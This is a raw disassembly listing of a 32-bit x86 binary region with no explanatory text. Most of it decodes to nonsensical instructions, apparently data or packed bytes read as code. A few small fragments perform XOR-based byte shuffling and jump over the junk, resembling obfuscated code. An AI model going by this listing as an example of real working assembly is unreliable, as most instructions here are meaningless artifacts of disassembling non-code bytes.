  412d6b:	ins    DWORD PTR es:[edi],dx
  412d6c:	xor    al,0xc9
  412d6e:	fnstenv [eax]
  412d70:	jnp    0x412d9e
  412d72:	mov    esp,0x9e39c4ee
  412d77:	loop   0x412d4c
  412d79:	xchg   ebx,eax
  412d7a:	pop    ecx
  412d7b:	int    0x3e
  412d7d:	ins    DWORD PTR es:[edi],dx
  412d7e:	cwde   
  412d7f:	ins    DWORD PTR es:[edi],dx
  412d80:	xchg   ecx,eax
  412d81:	pop    ss
  412d82:	outs   dx,BYTE PTR ds:[esi]
  412d83:	pop    ds
  412d84:	jno    0x412da6
  412d86:	(bad)  
  412d88:	mov    ?,WORD PTR [edi+0x6e9c264d]
  412d8e:	test   eax,0x4bfe226e
  412d93:	out    0xd1,al
  412d95:	or     BYTE PTR [edx],dh
  412d97:	adc    al,BYTE PTR [eax+0x5a]
  412d9a:	jecxz  0x412deb
  412d9c:	jmp    0xe5d58f42
  412da1:	jo     0x412df2
  412da3:	arpl   WORD PTR [edx+ebx*8],ax
  412da6:	or     al,0xbc
  412da8:	rol    DWORD PTR [eax],cl
  412daa:	mov    ds:0x89bc005e,eax
  412daf:	mov    es,WORD PTR [ecx-0x53]
  412db2:	sbb    al,0x30
  412db4:	leave  
  412db5:	popf   
  412db6:	je     0x412d38
  412db8:	scas   eax,DWORD PTR es:[edi]
  412db9:	cmp    BYTE PTR [eax+ebx*4+0x55112b98],bl
  412dc0:	rcr    DWORD PTR [esi-0x15],1
  412dc3:	in     eax,dx
  412dc4:	imul   esp,edi,0xa860e602
  412dca:	push   es
  412dcb:	xor    ecx,edx
  412dcd:	pusha  
  412dce:	fld    TBYTE PTR [ebx+eiz*2]
  412dd1:	std    
  412dd2:	jecxz  0x412d8c
  412dd4:	fstp   DWORD PTR [edx-0x36]
  412dd7:	in     eax,dx
  412dd8:	mov    esp,0x6208f2c6
  412ddd:	mov    ds:0xe2fe790a,al
  412de2:	ja     0x412d8f
  412de4:	mov    bl,0xd9
  412de6:	sub    eax,0x2d9f37b7
  412deb:	mov    edx,0xa5a37949
  412df0:	inc    edi
  412df1:	ret    0x4c36
  412df4:	popa   
  412df5:	icebp  
  412df6:	jecxz  0x412e63
  412df8:	xor    al,ch
  412dfa:	aaa    
  412dfb:	mov    dh,0xa8
  412dfd:	inc    edx
  412dfe:	and    DWORD PTR [edx+0x4395774b],ebp
  412e04:	xchg   ecx,eax
  412e05:	jg     0x412e2e
  412e07:	cmp    ah,BYTE PTR [edx+0x6a]
  412e0a:	adc    BYTE PTR [eax+0x6bc97860],ch
  412e10:	xor    eax,DWORD PTR cs:[ebx+0x6199f7c8]
  412e17:	outs   dx,DWORD PTR ds:[esi]
  412e18:	sbb    esp,0xc838efc8
  412e1e:	push   edi
  412e1f:	int    0x4e
  412e21:	mov    dl,0xed
  412e23:	ss xchg esi,eax
  412e25:	mov    fs,WORD PTR [esi]
  412e27:	cmp    eax,0x74a3d11e
  412e2c:	addr16 out dx,eax
  412e2e:	aas    
  412e2f:	popf   
  412e30:	mov    WORD PTR [edi],fs
  412e32:	jne    0x412df3
  412e34:	arpl   cx,dx
  412e36:	pop    esp
  412e37:	jle    0x412dec
  412e39:	sti    
  412e3a:	aam    0x72
  412e3c:	es pop esp
  412e3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e3f:	ins    BYTE PTR es:[edi],dx
  412e40:	mov    ah,0x4a
  412e42:	adc    dl,0x98
  412e45:	std    
  412e46:	in     eax,dx
  412e47:	fisubr DWORD PTR [edi-0x17]
  412e4a:	lods   al,BYTE PTR ds:[esi]
  412e4b:	ret    
  412e4c:	fdivrp st(4),st
  412e4e:	inc    edi
  412e4f:	es mov dh,0x81
  412e53:	mov    esi,0xb64dfe7d
  412e58:	or     esi,ebx
  412e5a:	addr16 mov ds:0x5225,eax
  412e5e:	add    edx,0xffffffef
  412e61:	mov    al,ds:0x308ab05
  412e66:	mov    ebp,0x395e8ce4
  412e6b:	mov    bh,0x2d
  412e6d:	out    dx,al
  412e6e:	int    0x1c
  412e70:	inc    edi
  412e71:	loop   0x412e42
  412e73:	not    DWORD PTR ds:0xec74751b
  412e79:	pop    esi
  412e7a:	(bad)
  412e7e:	sti    
  412e7f:	jbe    0x412ec9
  412e81:	sub    BYTE PTR [esi-0x1a],dl
  412e84:	outs   dx,BYTE PTR ds:[esi]
  412e85:	mov    dl,0xc1
  412e87:	scas   eax,DWORD PTR es:[edi]
  412e88:	jp     0x412ee5
  412e8a:	jne    0x412efd
  412e8c:	inc    eax
  412e8d:	(bad)  
  412e8e:	cmp    BYTE PTR [ecx+0x73],dl
  412e91:	rcl    bh,cl
  412e93:	pop    ecx
  412e94:	mov    dl,0xb7
  412e96:	or     eax,0xf07982a8
  412e9b:	mov    eax,ds:0xdde76b1b
  412ea0:	loopne 0x412ecc
  412ea2:	aam    0x26
  412ea4:	jbe    0x412e91
  412ea6:	push   cs
  412ea7:	fadd   DWORD PTR [esi]
  412ea9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412eaa:	xchg   esi,eax
  412eab:	ins    BYTE PTR es:[edi],dx
  412eac:	sub    al,0x49
  412eae:	aaa    
  412eaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412eb0:	mov    esi,0xc8876dca
  412eb5:	scas   al,BYTE PTR es:[edi]
  412eb6:	sub    DWORD PTR [ecx],edx
  412eb8:	mov    ch,0xd8
  412eba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ebb:	clc    
  412ebc:	popa   
  412ebd:	or     esp,DWORD PTR [ebx+0x6a1e5217]
  412ec3:	int3   
  412ec4:	adc    DWORD PTR [ebx-0x52],esp
  412ec7:	jp     0x412f2f
  412ec9:	sbb    edi,DWORD PTR [edx+0x5e2b3b8f]
  412ecf:	push   ds
  412ed0:	xor    eax,0x3c1d0dae
  412ed5:	mov    bh,0x3e
  412ed7:	mov    cl,0x17
  412ed9:	mov    esi,0x97d3dc76
  412ede:	inc    edx
  412edf:	pushf  
  412ee0:	jmp    0x61dc1644
  412ee5:	jns    0x412ef6
  412ee7:	mov    bh,0xcf
  412ee9:	mov    ah,0xa8
  412eeb:	mov    al,ds:0x1ec1d81f
  412ef0:	pop    edx
  412ef1:	outs   dx,BYTE PTR ds:[esi]
  412ef2:	shr    DWORD PTR [eax+0x1f],0x16
  412ef6:	mov    ch,0xe7
  412ef8:	cdq    
  412ef9:	mov    BYTE PTR [ebp+0xf],dl
  412efc:	mov    edx,DWORD PTR [ebp-0xc]
  412eff:	xor    edx,eax
  412f01:	add    edx,DWORD PTR [ebp-0x14]
  412f04:	mov    edi,DWORD PTR [ebp-0x1c]
  412f07:	mov    dl,BYTE PTR [edx+edi*1+0x327298]
  412f0e:	mov    BYTE PTR [ebp+0xb],dl
  412f11:	mov    dl,BYTE PTR [ebp+0xf]
  412f14:	jmp    0x41319c
  412f19:	aas    
  412f1a:	cmp    eax,0x3e3d3e3f
  412f1f:	cmp    eax,0xcf00063d
  412f24:	sbb    al,0x8a
  412f26:	test   eax,0x75691beb
  412f2b:	js     0x412fa5
  412f2d:	in     eax,0x7e
  412f2f:	js     0x412fa9
  412f31:	dec    eax
  412f32:	cmp    ch,bh
  412f34:	xor    esp,DWORD PTR [esp+edi*4-0x4c]
  412f38:	lea    esp,[ebx-0x5]
  412f3b:	push   ecx
  412f3c:	lea    esp,[edi]
  412f3e:	js     0x412f31
  412f40:	scas   eax,DWORD PTR es:[edi]
  412f41:	mov    esi,0x206083e9
  412f46:	cld    
  412f47:	or     cl,BYTE PTR [esi+0x40471329]
  412f4d:	sbb    eax,0x2ce78cfb
  412f52:	test   al,0x0
  412f54:	and    DWORD PTR [esi],0x63e5c38e
  412f5a:	enter  0xea37,0x20
  412f5e:	sub    eax,0x60182e0c
  412f63:	mov    eax,ds:0x4ec0ad11
  412f68:	stc    
  412f69:	push   cs
  412f6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412f6b:	add    DWORD PTR [eax-0x7c],edi
  412f6e:	pop    edx
  412f6f:	add    BYTE PTR [ecx-0x6e5ced1f],cl
  412f75:	mov    bh,0x1c
  412f77:	push   edi
  412f78:	mov    ds:0xb8875375,al
  412f7d:	adc    BYTE PTR [edx],bl
  412f7f:	sahf   
  412f80:	push   edi
  412f81:	out    dx,al
  412f82:	push   ecx
  412f83:	xor    DWORD PTR [ebx-0x3f16854b],esi
  412f89:	in     al,dx
  412f8a:	jne    0x412f83
  412f8c:	and    al,0xc2
  412f8e:	or     BYTE PTR [edx+0x78],cl
  412f91:	pop    ecx
  412f92:	adc    bl,BYTE PTR [edi+0x7a]
  412f95:	mov    ds:0x8f65cb6c,al
  412f9a:	sub    eax,0x7f74e89b
  412f9f:	dec    ecx
  412fa0:	pop    ds
  412fa1:	push   ecx
  412fa2:	inc    ebx
  412fa3:	loop   0x412fdd
  412fa5:	mov    dh,0x8f
  412fa7:	adc    al,0x6e
  412fa9:	je     0x412f4b
  412fab:	cmp    DWORD PTR [ebx-0x5e],edi
  412fae:	jno    0x412fe6
  412fb0:	bound  eax,QWORD PTR [edx+ecx*4-0x6e791699]
  412fb7:	test   al,0xc3
  412fb9:	retf   0x7743
  412fbc:	(bad)  
  412fbd:	fimul  DWORD PTR [edi+edi*4]
  412fc0:	mov    esi,0x2615672f
  412fc5:	ds aam 0x38
  412fc8:	call   0xd1fc73f3
  412fcd:	push   cs
  412fce:	js     0x412f8b
  412fd0:	call   0xc890:0x7bcdcc3
  412fd7:	cmp    DWORD PTR [esi-0x39],ecx
  412fda:	inc    esp
  412fdb:	outs   dx,BYTE PTR ds:[esi]
  412fdc:	xlat   BYTE PTR ds:[ebx]
  412fdd:	jg     0x413046
  412fdf:	loope  0x41304d
  412fe1:	inc    esi
  412fe2:	pushf  
  412fe3:	jmp    0x8431:0x84470ac
  412fea:	pushf  
  412feb:	xor    ebp,DWORD PTR [edi+0x7e]
  412fee:	sar    BYTE PTR [eax+0xf],0x96
  412ff2:	push   esi
  412ff3:	cmp    eax,0x84f34ada
  412ff8:	push   ebx
  412ff9:	lods   eax,DWORD PTR ds:[esi]
  412ffa:	and    ebx,edx
  412ffc:	xchg   BYTE PTR [eax+0x22],ch
  412fff:	fwait
  413000:	rcr    DWORD PTR [esi+0x4b817441],cl
  413006:	inc    edi
  413007:	sub    bh,dl
  413009:	sbb    DWORD PTR [ebp+0x67a10456],0x14
  413010:	in     al,0xfc
  413012:	loopne 0x412fb2
  413014:	sub    BYTE PTR [eax+0x2],0x2f
  413018:	loope  0x412fcb
  41301a:	test   DWORD PTR [edi-0x2d8d01f7],ebx
  413020:	sar    DWORD PTR [edi],cl
  413022:	push   edi
  413023:	pop    ss
  413024:	and    cl,BYTE PTR [esi-0x6]
  413027:	(bad)  
  413028:	pop    esi
  413029:	xor    bh,BYTE PTR [ebx-0x53b6b588]
  41302f:	retf   0xfaf9
  413032:	out    dx,eax
  413033:	pop    ebx
  413034:	repnz add al,0x3b
  413037:	repz div DWORD PTR [edx]
  41303a:	cli    
  41303b:	dec    edx
  41303c:	fiadd  WORD PTR [ebx+0x4c43922d]
  413042:	and    DWORD PTR [bp+di+0x6c],ebx
  413046:	push   es
  413047:	out    dx,al
  413048:	fs leave 
  41304a:	sub    esi,DWORD PTR [edx+0x2a]
  41304d:	xchg   ecx,eax
  41304e:	jne    0x413062
  413050:	xor    DWORD PTR [esi],edi
  413052:	cmp    eax,0x91e7da29
  413057:	das    
  413058:	dec    ecx
  413059:	xchg   BYTE PTR [ebx+0x13],cl
  41305c:	cmc    
  41305d:	jmp    0x4ec:0xd3edfa6a
  413064:	fs or  al,0xc
  413067:	mov    bh,0x14
  413069:	je     0x4130cd
  41306b:	pop    esp
  41306c:	repnz sub al,BYTE PTR [ebp+0x7e]
  413070:	pop    esi
  413071:	stos   BYTE PTR es:[edi],al
  413072:	xor    bh,dl
  413074:	imul   ebp,DWORD PTR [edi+0x9],0xe9859aa5
  41307b:	popa   
  41307c:	sbb    ecx,edi
  41307e:	push   eax
  41307f:	dec    ebp
  413080:	ficom  WORD PTR [eax-0x26]
  413083:	cli    
  413084:	push   0x8f2d89a6
  413089:	sub    eax,0x4882f061
  41308e:	pop    esp
  41308f:	and    eax,0x15c6aa5c
  413094:	aam    0x7e
  413096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413097:	aaa    
  413098:	fisttp QWORD PTR [edi-0x1b15b64f]
  41309e:	adc    DWORD PTR [eax+edi*4-0x1a],esi
  4130a2:	aam    0xef
  4130a4:	push   ebx
  4130a6:	(bad)  
  4130a7:	and    esi,DWORD PTR [edi]
  4130a9:	call   0x4efb:0x97a565ea
  4130b0:	jb     0x413061
  4130b2:	enter  0xa94c,0x2d
  4130b6:	cmp    al,0x55
  4130b8:	inc    edi
  4130b9:	cld    
  4130ba:	call   0xe3f9:0xc875fbb1
  4130c1:	pop    ss
  4130c2:	inc    edx
  4130c3:	mov    ebp,0xe1e6b51
  4130c8:	jno    0x413115
  4130ca:	dec    edi
  4130cb:	cmp    DWORD PTR [ebp-0x4fe9027e],esp
  4130d1:	ins    BYTE PTR es:[edi],dx
  4130d2:	inc    esp
  4130d3:	call   DWORD PTR [ecx]
  4130d5:	outs   dx,BYTE PTR ds:[esi]
  4130d6:	popa   
  4130d7:	mov    ebp,0x15464033
  4130dc:	xor    al,0x7
  4130de:	popf   
  4130df:	adc    eax,0x8b9a03b
  4130e4:	js     0x4130e3
  4130e6:	jl     0x413150
  4130e8:	daa    
  4130e9:	ret    
  4130ea:	mov    ah,0x48
  4130ec:	jmp    0xe5fcdf12
  4130f1:	push   es
  4130f2:	mov    eax,ds:0x5f129de1
  4130f7:	(bad)  
  4130f8:	pop    ebx
  4130f9:	cmp    DWORD PTR [ecx+0x6bb95b0],esi
  4130ff:	jle    0x413159
  413101:	cdq    
  413102:	xchg   edx,eax
  413103:	sub    BYTE PTR [eax-0x41],dl
  413106:	adc    al,0xaf
  413108:	pop    ebx
  413109:	lahf   
  41310a:	add    bh,dh
  41310c:	imul   esi,DWORD PTR ds:0xf330e5ba,0xfaad3a25
  413116:	mov    ebp,0x33d7c60e
  41311b:	sti    
  41311c:	pop    ss
  41311d:	jg     0x413125
  41311f:	dec    edx
  413120:	inc    eax
  413121:	add    BYTE PTR [ecx+0x27],bh
  413124:	sbb    DWORD PTR [ebx],edi
  413126:	cmp    dh,ah
  413128:	adc    ebx,DWORD PTR [eax-0x18]
  41312b:	or     BYTE PTR [eax+0x35],0x57
  41312f:	and    bh,ah
  413131:	push   ebx
  413132:	jle    0x4130c5
  413134:	mov    esi,0x7e0a7cbf
  413139:	ror    DWORD PTR [ebp-0x20d5ed5a],1
  41313f:	cdq    
  413140:	aaa    
  413141:	call   0x8f58:0x30d6a46f
  413148:	repz call 0x62475a36
  41314e:	and    DWORD PTR [edi-0x781d6452],edi
  413154:	aaa    
  413155:	cmp    ebx,DWORD PTR [ebx+0x64]
  413158:	mov    ?,WORD PTR [esp+eax*1+0x2d]
  41315c:	mov    ebp,esp
  41315e:	stos   BYTE PTR es:[edi],al
  41315f:	in     eax,0x7b
  413161:	mov    dh,0xfc
  413163:	mov    al,ds:0xe69155bb
  413168:	test   BYTE PTR [esi+esi*1],al
  41316b:	test   al,0xf4
  41316d:	mov    ch,0xbd
  41316f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413170:	adc    eax,0x5bea6f7c
  413175:	(bad)  
  413176:	xchg   edi,eax
  413177:	xlat   BYTE PTR ds:[ebx]
  413178:	fcomp  QWORD PTR [esi+0x17]
  41317b:	jl     0x41315d
  41317d:	pop    eax
  41317e:	leave  
  41317f:	dec    edi
  413180:	das    
  413181:	dec    ebp
  413182:	push   esp
  413183:	jg     0x413184
  413185:	imul   ebx
  413187:	leave  
  413188:	test   DWORD PTR [esi],ebp
  41318a:	aas    
  41318b:	push   ebp
  41318c:	jmp    0xeb63bce8
  413191:	shl    BYTE PTR [edi+eiz*4],1
  413194:	retf   
  413195:	(bad)  
  413196:	(bad)  
  413197:	jne    0x413158
  413199:	xchg   edi,eax
  41319a:	in     al,dx
  41319b:	repnz mov edi,DWORD PTR [ebp-0xc]
  41319f:	xor    edi,eax
  4131a1:	add    edi,DWORD PTR [ebp-0x14]
  4131a4:	mov    ebx,DWORD PTR [ebp-0x1c]
  4131a7:	mov    BYTE PTR [edi+ebx*1+0x327298],dl
  4131ae:	mov    dl,BYTE PTR [ebp+0xb]
  4131b1:	mov    edi,DWORD PTR [ebp-0x18]
  4131b4:	xor    edi,eax
  4131b6:	jmp    0x41343e
  4131bb:	cmp    eax,0xc2c6c2c3
  4131c0:	(bad)
  4131c3:	pop    ebp
  4131c4:	in     al,0x25
  4131c6:	inc    edi
  4131c7:	mov    dh,0x2
  4131c9:	mov    eax,ds:0x787ad6b8
  4131ce:	js     0x4131b5
  4131d0:	jle    0x41324a
  4131d2:	js     0x413251
  4131d4:	in     al,0x7d
  4131d6:	mov    edi,0x19375f04
  4131db:	lahf   
  4131dc:	or     DWORD PTR [edi],0xffffffe8
  4131df:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4131e0:	xchg   BYTE PTR [edi+edi*1],dh
  4131e3:	jbe    0x41321a
  4131e5:	sbb    eax,DWORD PTR [edi+0x1e364bc8]
  4131eb:	xlat   BYTE PTR ds:[ebx]
  4131ec:	cmp    BYTE PTR [ecx],bl
  4131ee:	push   ebx
  4131ef:	sub    edi,eax
  4131f1:	push   esi
  4131f2:	bound  esi,QWORD PTR [esi]
  4131f4:	add    eax,0x9f8581c0
  4131f9:	mov    bl,0x17
  4131fb:	out    dx,al
  4131fc:	pop    ss
  4131fd:	pop    es
  4131fe:	dec    esp
  4131ff:	add    esp,DWORD PTR [esi+0x56]
  413202:	sbb    cl,BYTE PTR [ecx]
  413204:	mov    ebx,?
  413206:	xrstors [edx]
  413209:	test   al,0x3
  41320b:	fistp  DWORD PTR [eax]
  41320d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41320e:	mov    al,0x21
  413210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413211:	adc    BYTE PTR [ebx+0x5],al
  413214:	mov    ecx,0x569bea3
  413219:	xor    al,0xf1
  41321b:	mov    DWORD PTR [edx+0x3d],edx
  41321e:	aam    0x53
  413220:	inc    eax
  413221:	xchg   edi,eax
  413222:	xor    BYTE PTR [edx+0x15],al
  413225:	mov    ebx,0x302f603e
  41322a:	mov    esp,0x310c95d0
  41322f:	call   DWORD PTR [edi]
  413231:	xchg   di,ax
  413233:	xchg   edi,eax
  413234:	xor    ebp,0xcaf3d0d2
  41323a:	out    0xa8,eax
  41323c:	jnp    0x413244
  41323e:	dec    ecx
  41323f:	inc    ecx
  413240:	sub    eax,0x588f718f
  413245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413246:	loop   0x41328f
  413248:	iret   
  413249:	ss dec edx
  41324b:	mov    ch,0xaa
  41324d:	xchg   esp,eax
  41324e:	(bad)  
  41324f:	mov    ds:0x26ca0eac,al
  413254:	mov    ebp,0x50f6b107
  413259:	dec    ecx
  41325a:	popaw  
  41325c:	popa   
  41325d:	mov    WORD PTR [ebp-0x7eefd15d],ss
  413263:	jle    0x4132b6
  413265:	pop    ebp
  413266:	sbb    DWORD PTR [edx],0x292f1d59
  41326c:	shl    al,1
  41326e:	idiv   ecx
  413270:	lods   eax,DWORD PTR ds:[esi]
  413271:	jb     0x413273
  413273:	xchg   ebx,eax
  413274:	sbb    eax,0x79e0b65e
  413279:	js     0x41328f
  41327b:	jmp    0xa1fe77ba
  413280:	and    al,0xce
  413282:	adc    al,0x3a
  413284:	push   cs
  413285:	adc    eax,0xbe939997
  41328a:	xchg   ebp,eax
  41328b:	mov    ds:0xad1ae749,al
  413290:	xor    BYTE PTR [ecx+0x4e],bl
  413293:	rcl    bh,cl
  413295:	inc    ecx
  413296:	outs   dx,BYTE PTR ds:[esi]
  413297:	or     eax,0x9e315ffe
  41329c:	mov    bl,0xeb
  41329e:	outs   dx,DWORD PTR ds:[esi]
  41329f:	das    
  4132a0:	or     ah,BYTE PTR [esi+0xe]
  4132a3:	xchg   ebp,eax
  4132a4:	clc    
  4132a5:	stos   DWORD PTR es:[edi],eax
  4132a6:	mov    ebx,0xa97488d2
  4132ab:	std    
  4132ac:	push   ebx
  4132ad:	mov    ebp,0x8b1d39d5
  4132b2:	bound  esp,QWORD PTR [ebx-0x75]
  4132b5:	mov    eax,ds:0xfeb97ad1
  4132ba:	mov    esp,0xd69c6d09
  4132bf:	mul    BYTE PTR [edx+0x5d71de5a]
  4132c5:	pop    ebp
  4132c6:	jge    0x413249
  4132c8:	add    cl,BYTE PTR [ecx+0x72]
  4132cb:	jae    0x41329f
  4132cd:	test   DWORD PTR [ebx-0x2d],ecx
  4132d0:	xchg   esp,eax
  4132d1:	cmp    DWORD PTR [edi],esi
  4132d3:	add    DWORD PTR [edx-0x33850c37],ecx
  4132d9:	sbb    BYTE PTR [ebp+0x3887452d],dl
  4132df:	mov    eax,0x84612d74
  4132e4:	mov    eax,0x7b815d81
  4132e9:	sub    bl,dh
  4132eb:	xor    dl,BYTE PTR [esi-0x540c2e20]
  4132f1:	and    eax,0x77194ca5
  4132f6:	push   ds
  4132f7:	pop    edi
  4132f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132f9:	mov    edx,0xada839dc
  4132fe:	mov    bl,0x5a
  413300:	imul   ebp,DWORD PTR [ebp+ebp*2+0x5800d7e6],0x2f147240
  41330b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41330c:	ficom  DWORD PTR [edx+0x5d]
  41330f:	and    DWORD PTR [eax],edx
  413311:	icebp  
  413312:	into   
  413313:	sbb    eax,0xe9de857a
  413318:	daa    
  413319:	fs push cs
  41331b:	(bad)  
  41331c:	jno    0x4132b1
  41331e:	iret   
  41331f:	mov    BYTE PTR [edi+edi*2+0x54f88391],dl
  413326:	add    dh,BYTE PTR [ebp+0x58645a1d]
  41332c:	cmp    DWORD PTR [edi-0x44],esi
  41332f:	inc    eax
  413330:	aad    0xce
  413332:	xor    BYTE PTR [ecx-0x1090cd9],al
  413338:	(bad)  
  41333a:	clc    
  41333b:	div    DWORD PTR [edi]
  41333d:	clc    
  41333e:	mov    edx,0x4a7f4c12
  413343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413344:	sub    al,0x4f
  413346:	pop    edi
  413347:	adc    ah,ah
  413349:	ss mov sp,0x56d4
  41334e:	and    eax,0xe96b07b
  413353:	push   es
  413354:	add    al,bl
  413356:	clc    
  413357:	fmulp  st(5),st
  413359:	mov    ebp,ebp
  41335b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41335c:	shl    DWORD PTR [ecx+0x65],0x80
  413360:	or     BYTE PTR [ebx+0x20bbb4e5],bl
  413366:	jb     0x413338
  413368:	pop    ecx
  413369:	outs   dx,BYTE PTR ds:[esi]
  41336a:	dec    eax
  41336b:	leave  
  41336c:	sub    BYTE PTR [esp+esi*2-0x6c],0x6b
  413371:	pop    eax
  413372:	fiadd  WORD PTR [edx+0x6f72cda7]
  413378:	mov    edi,0x13d8fbac
  41337d:	retf   
  41337e:	lock out dx,eax
  413380:	dec    esi
  413381:	pop    es
  413382:	adc    BYTE PTR [ebx],al
  413384:	std    
  413385:	inc    edi
  413386:	(bad)  
  413387:	sub    al,0xda
  413389:	push   0xffffffed
  41338b:	shl    DWORD PTR [ebx+0x153819fd],cl
  413391:	enter  0x4ac3,0xf9
  413395:	sub    al,0x2f
  413397:	push   ebx
  413398:	jne    0x4133d7
  41339a:	int3   
  41339b:	jge    0x4133b6
  41339d:	stos   DWORD PTR es:[edi],eax
  41339e:	or     al,0x3a
  4133a0:	ret    
  4133a1:	xor    BYTE PTR [edi+0x5d],bl
  4133a4:	cmp    al,0xe9
  4133a6:	mov    bl,0x29
  4133a8:	icebp  
  4133a9:	adc    ebx,edx
  4133ab:	test   BYTE PTR [edi+0x68],bl
  4133ae:	or     DWORD PTR [ebx],ebp
  4133b0:	ret    
  4133b1:	iret   
  4133b2:	popf   
  4133b3:	lea    ebp,[edi+0x7c]
  4133b6:	jl     0x4133ad
  4133b8:	lods   eax,DWORD PTR ds:[esi]
  4133b9:	push   es
  4133ba:	sub    eax,0xbe5c1e79
  4133bf:	cmp    al,0x62
  4133c1:	cmp    cl,BYTE PTR [ebp-0x5c45f1e1]
  4133c7:	fsub   st(3),st
  4133c9:	dec    ebx
  4133ca:	(bad)  
  4133cb:	ins    DWORD PTR es:[edi],dx
  4133cc:	(bad)  
  4133cd:	ins    DWORD PTR es:[edi],dx
  4133ce:	call   0xe3f7:0x202b2f2b
  4133d5:	sar    DWORD PTR [ecx],0x1
  4133d8:	pop    edx
  4133d9:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133db:	and    eax,0x85577159
  4133e0:	fnstcw WORD PTR [eax+0xef628b5]
  4133e6:	push   ebx
  4133e7:	or     BYTE PTR [ecx-0xc96647c],ah
  4133ed:	dec    ecx
  4133ee:	hlt    
  4133ef:	or     dl,0xe7
  4133f2:	cmp    al,0x33
  4133f4:	(bad)  
  4133f5:	mov    ds:0x56d686b6,al
  4133fa:	ins    BYTE PTR es:[edi],dx
  4133fb:	aam    0x7f
  4133fd:	add    BYTE PTR [ecx+esi*8+0x4d61ca6b],ah
  413404:	fwait
  413405:	and    esi,ebp
  413407:	cmp    BYTE PTR [ecx-0x5331dcbb],0xff
  41340e:	gs jecxz 0x413398
  413411:	popa   
  413412:	lods   al,BYTE PTR ds:[esi]
  413413:	mov    al,0xec
  413415:	aas    
  413416:	fidivr DWORD PTR [eax+ecx*1]
  413419:	cli    
  41341a:	add    DWORD PTR [edx-0x7d],esp
  41341d:	shr    bl,1
  41341f:	ins    DWORD PTR es:[edi],dx
  413420:	les    eax,FWORD PTR [esi+0x74]
  413423:	mov    WORD PTR [esi-0x16ab6a76],?
  413429:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41342a:	jg     0x413472
  41342c:	sub    DWORD PTR [eax],eax
  41342e:	push   cs
  41342f:	mov    ds,ebp
  413431:	or     al,0x95
  413433:	and    al,0xd6
  413435:	cli    
  413436:	push   cs
  413437:	or     dl,BYTE PTR [edx-0x41f2deb4]
  41343d:	xor    eax,0x8bec7d03
  413442:	pop    ebp
  413443:	in     al,0x88
  413445:	xchg   esp,eax
  413446:	pop    ds
  413447:	cwde   
  413448:	jb     0x41347c
  41344a:	add    cl,ch
  41344c:	add    DWORD PTR [edx],0x0
  41344f:	add    al,cl
  413451:	(bad)
  413454:	(bad)  
  413456:	(bad)  
  413458:	cld    
  413459:	imul   ecx,esi,0x659ff25e
  41345f:	ins    DWORD PTR es:[edi],dx
  413460:	inc    ebx
  413461:	js     0x4134e2
  413463:	js     0x41344a
  413465:	jle    0x4134df
  413467:	js     0x41344f
  413469:	adc    ecx,edx
  41346b:	jo     0x413411
  41346d:	(bad)  [eax]
  41346f:	out    0x9b,eax
  413471:	vcomiss xmm5,DWORD PTR [eax+0x4e]
  413476:	push   edx
  413477:	clc    
  413478:	int3   
  413479:	add    BYTE PTR es:[ebx-0x55f3dab9],cl
  413480:	outs   dx,BYTE PTR ds:[esi]
  413482:	mov    esi,0x67bf4796
  413487:	mov    al,ds:0xddcc88f1
  41348c:	mov    ecx,0x6a93e8a7
  413491:	cmc    
  413492:	push   0xba16939f
  413497:	or     BYTE PTR [eax-0x7aca74b1],bh
  41349d:	cdq    
  41349e:	dec    edi
  41349f:	scas   al,BYTE PTR es:[edi]
  4134a0:	lea    eax,[edx]
  4134a2:	mov    ch,0xd8
  4134a4:	call   0x870a0b76
  4134a9:	adc    eax,0x192402e7
  4134ae:	lods   eax,DWORD PTR ds:[esi]
  4134af:	jl     0x413470
  4134b1:	inc    ebx
  4134b2:	fwait
  4134b3:	and    BYTE PTR [esi+0x19],ch
  4134b6:	add    bl,BYTE PTR [esi-0x160c5219]
  4134bc:	outs   dx,BYTE PTR ds:[esi]
  4134bd:	fist   WORD PTR [ecx+0x3d63de0e]
  4134c3:	dec    ebx
  4134c4:	add    BYTE PTR [ecx+ebx*2-0x52],dl
  4134c8:	jno    0x413547
  4134ca:	std    
  4134cb:	mov    ds:0xf8d1a379,eax
  4134d0:	lahf   
  4134d1:	out    0xfd,al
  4134d3:	sbb    ecx,ebx
  4134d5:	in     eax,0xf
  4134d7:	retf   
  4134d8:	inc    edx
  4134d9:	ins    DWORD PTR es:[edi],dx
  4134da:	xchg   esi,eax
  4134db:	lods   al,BYTE PTR ds:[esi]
  4134dc:	enter  0x5eba,0x40
  4134e0:	cmp    eax,0x537e037d
  4134e5:	xor    al,0x18
  4134e7:	js     0x413477
  4134e9:	mov    ebp,0x771e190f
  4134ee:	nop
  4134ef:	or     BYTE PTR [eax+0x9],0x21
  4134f3:	mov    al,ds:0xcb78c1d9
  4134f8:	arpl   WORD PTR [ebp-0x7d1a357b],di
  4134fe:	xor    DWORD PTR [ebx],esp
  413500:	mov    bl,0x37
  413502:	cwde   
  413503:	pop    ebx
  413504:	pop    ebx
  413505:	loop   0x4134b7
  413507:	popa   
  413508:	xchg   esi,eax
  413509:	dec    ebp
  41350a:	ret    0xcd8a
  41350d:	arpl   si,cx
  41350f:	call   0xe0065166
  413514:	lds    ebx,FWORD PTR [edi-0x56]
  413517:	xchg   edi,eax
  413518:	scas   al,BYTE PTR es:[edi]
  413519:	out    0x1,al
  41351b:	cmp    BYTE PTR ds:0x81072676,ch
  413521:	mov    cl,0x6
  413523:	frndint 
  413525:	xor    BYTE PTR [edx],al
  413527:	or     ebx,ebp
